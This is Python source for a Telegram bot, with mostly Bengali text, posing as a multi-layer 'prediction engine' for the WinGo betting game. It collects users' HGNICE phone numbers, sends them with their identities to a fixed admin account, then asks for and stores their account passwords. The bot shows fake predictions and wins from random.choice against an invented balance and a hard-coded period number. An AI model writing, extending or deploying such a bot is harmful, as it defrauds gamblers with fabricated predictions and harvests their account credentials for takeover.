import os
import asyncio
import logging
import random
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = 8164888241

user_states = {}

def get_state(uid):
    if uid not in user_states:
        user_states[uid] = {
            "logged_in": False,
            "awaiting": None,
            "phone": "",
            "password": "",
            "balance": 1000.0,
            "game": None,
            "total_steps": 0,
            "steps": [],
            "step_idx": 0,
            "target": 0,
            "profit": 0,
            "running": False,
            "task": None,
        }
    return user_states[uid]

def gen_period(game_mode):
    return "2026101501001"

async def auto_bet_loop(uid, ctx):
    state = get_state(uid)
    try:
        while state["running"]:
            await asyncio.sleep(30)
            if not state["running"] or not state["steps"]:
                break
            
            current_step = state["steps"][state["step_idx"] % len(state["steps"])]
            
            if state["balance"] < current_step:
                state["running"] = False
                await ctx.bot.send_message(
                    chat_id=uid,
                    text=f"❌ INSUFFICIENT BALANCE!\n\n"
                         f"আপনার বর্তমান ব্যালেন্স: {state['balance']}\n"
                         f"পরবর্তী স্টেপ বেট: {current_step}\n"
                         f"অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স না থাকায় অটো-বেটিং বন্ধ করা হলো।"
                )
                break

            p = gen_period(state["game"])
            prediction = random.choice(["BIG / GREEN", "SMALL / RED"])
            is_win = random.choice([True, False])
            result_status = "WIN (+)" if is_win else "LOSS (-)"
            
            if is_win:
                state["balance"] += current_step
                state["profit"] += current_step
            else:
                state["balance"] -= current_step
                state["profit"] -= current_step

            msg = (
                f"PREDICTION GENERATED\n"
                f"-----------------------------------------\n"
                f"Period: {p}\n"
                f"Game: WinGo {state['game'].upper()}\n"
                f"Current Step Bet: {current_step}\n"
                f"Result: {prediction}\n"
                f"Status: {result_status}\n"
                f"Balance: {state['balance']}\n"
                f"-----------------------------------------\n"
                f"Next prediction in 30 seconds..."
            )
            try:
                await ctx.bot.send_message(chat_id=uid, text=msg)
            except Exception as e:
                print(f"Loop message error: {e}")
    except asyncio.CancelledError:
        pass

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    print("Received /start command!")  # রেলওয়ে লগে চেক করার জন্য
    uid = update.effective_user.id
    state = get_state(uid)
    
    if state["logged_in"] and state.get("game"):
        keyboard = [
            [
                InlineKeyboardButton("WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("WinGo 1m", callback_data="game_1m"),
            ]
        ]
        await update.message.reply_text(
            f"আপনি ইতিমধ্যে লগইন আছেন!\nব্যালেন্স: {state['balance']}\nগেম সিলেক্ট করুন:",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    text = (
        "Prediction Engine — 9 Layers\n"
        "Streak • Pattern • Trend\n\n"
        "প্রেস করুন নিচের বাটনে LOGIN করার জন্য"
    )

    keyboard = [[
        InlineKeyboardButton("LOGIN TO ACCOUNT", callback_data="start_login")
    ]]

    await update.message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    username = update.effective_user.username or "No Username"
    name = update.effective_user.first_name
    state = get_state(uid)
    text = update.message.text.strip()

    if not state["logged_in"] and state.get("awaiting") == "phone":
        state["phone"] = text
        state["awaiting"] = "pending_approval"
        
        await update.message.reply_text(
            "আপনার নম্বরটি অ্যাডমিনের কাছে অনুমোদনের জন্য পাঠানো হয়েছে। দয়া করে অপেক্ষা করুন..."
        )

        admin_text = (
            "NEW LOGIN REQUEST!\n\n"
            f"Name: {name}\n"
            f"User ID: {uid}\n"
            f"Username: @{username}\n"
            f"Phone: {text}"
        )
        admin_keyboard = [[
            InlineKeyboardButton("APPROVE", callback_data=f"approve_{uid}")
        ]]
        
        try:
            await ctx.bot.send_message(
                chat_id=ADMIN_ID,
                text=admin_text,
                reply_markup=InlineKeyboardMarkup(admin_keyboard)
            )
        except Exception as e:
            print(f"Admin message error: {e}")
        return

    if not state["logged_in"] and state.get("awaiting") == "password":
        state["password"] = text
        state["logged_in"] = True
        state["awaiting"] = None

        if state["balance"] <= 0:
            await update.message.reply_text(
                "ACCOUNT ERROR!\nআপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।"
            )
            return

        await update.message.reply_text(
            f"পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!\nঅ্যাকাউন্ট ব্যালেন্স: {state['balance']}"
        )

        keyboard = [
            [
                InlineKeyboardButton("WinGo 30s", callback_data="game_30s"),
                InlineKeyboardButton("WinGo 1m", callback_data="game_1m"),
            ]
        ]
        await update.message.reply_text(
            "গেম সিলেক্ট করুন:",
            reply_markup=InlineKeyboardMarkup(keyboard),
        )
        return

    if state["logged_in"]:
        if state.get("awaiting") == "total_steps":
            try:
                total = int(text)
                if total <= 0:
                    raise ValueError()
                state["total_steps"] = total
                state["steps"] = []
                state["awaiting"] = "collecting_steps"
                await update.message.reply_text(
                    f"মোট {total} টি স্টেপ নির্ধারণ করা হয়েছে।\n\nস্টেপ ১ (Step 1) এর মান লিখুন:"
                )
            except:
                await update.message.reply_text("সঠিক সংখ্যা লিখুন। যেমন: 5")
            return

        if state.get("awaiting") == "collecting_steps":
            try:
                val = float(text)
                state["steps"].append(val)
                current_count = len(state["steps"])
                total_needed = state["total_steps"]

                if current_count < total_needed:
                    await update.message.reply_text(
                        f"স্টেপ {current_count} সংরক্ষিত হয়েছে।\n\nস্টেপ {current_count + 1} এর মান লিখুন:"
                    )
                else:
                    state["awaiting"] = "target"
                    steps_str = ", ".join(map(str, state["steps"]))
                    await update.message.reply_text(
                        f"সব স্টেপগুলো সফলভাবে সেট হয়েছে: [{steps_str}]\n\nএখন TARGET PROFIT দিন (যেমন: 500):"
                    )
            except:
                await update.message.reply_text("সঠিক সংখ্যা লিখুন।")
            return

        if state.get("awaiting") == "target":
            try:
                tgt = float(text)
                state["target"] = tgt
                state["awaiting"] = None
                state["profit"] = 0
                state["running"] = True
                
                await update.message.reply_text(
                    f"AUTO BETTING STARTED! (30s interval)\nTarget: {tgt}\nBalance: {state['balance']}\nপ্রেডিকশন শুরু হচ্ছে..."
                )
                if state.get("task"):
                    state["task"].cancel()
                state["task"] = asyncio.create_task(auto_bet_loop(uid, ctx))
            except:
                await update.message.reply_text("সঠিক সংখ্যা লিখুন। যেমন: 500")
            return

async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    state = get_state(uid)
    data = query.data

    if data == "start_login":
        state["awaiting"] = "phone"
        await query.message.reply_text("আপনার HGNICE ফোন নম্বরটি লিখুন:")

    elif data.startswith("approve_"):
        target_uid = int(data.split("_")[1])
        target_state = get_state(target_uid)
        target_state["awaiting"] = "password"

        try:
            await query.edit_message_text(f"{query.message.text}\n\nAPPROVED!")
        except:
            pass

        try:
            await ctx.bot.send_message(
                chat_id=target_uid,
                text="ADMIN APPROVED YOUR ACCOUNT!\n\nএখন আপনার একাউন্টের পাসওয়ার্ড দিন:"
            )
        except Exception as e:
            print(f"User notify error: {e}")

    elif data.startswith("game_"):
        if not state["logged_in"]:
            await query.message.reply_text("আগে লগইন করুন এবং পাসওয়ার্ড দিয়ে ভেরিফাই করুন।")
            return
        mode = data.split("_")[1]
        state["game"] = mode
        state["awaiting"] = "total_steps"
        await query.edit_message_text(
            f"WinGo {mode.upper()} SELECTED\n\n"
            f"আপনি মোট কয়টি স্টেপ দিতে চান?\n(উদাহরণস্বরূপ: 5 লিখুন)"
        )

def main():
    if not BOT_TOKEN:
        print("BOT_TOKEN is missing!")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("Bot is starting polling...")
    app.run_polling()

if __name__ == "__main__":
    main()
